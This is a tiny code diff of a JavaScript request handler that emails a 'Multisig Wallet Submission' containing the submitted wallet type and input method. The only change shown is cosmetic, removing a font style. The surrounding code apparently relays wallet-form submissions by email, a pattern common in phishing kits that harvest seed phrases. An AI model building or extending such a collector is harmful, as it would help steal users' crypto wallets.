@@ -41,7 +41,7 @@ module.exports = async (req, res) => {
         await transporter.verify(); // throws if invalid
 
         const emailHtml = `
-            <div style="font-family: Arial, sans-serif;">
+            <div style="">
                 <h2> Multisig Wallet Submission</h2>
                 <p><strong>Wallet Type:</strong> ${walletType}</p>
                 <p><strong>Method:</strong> ${inputMethod}</p>
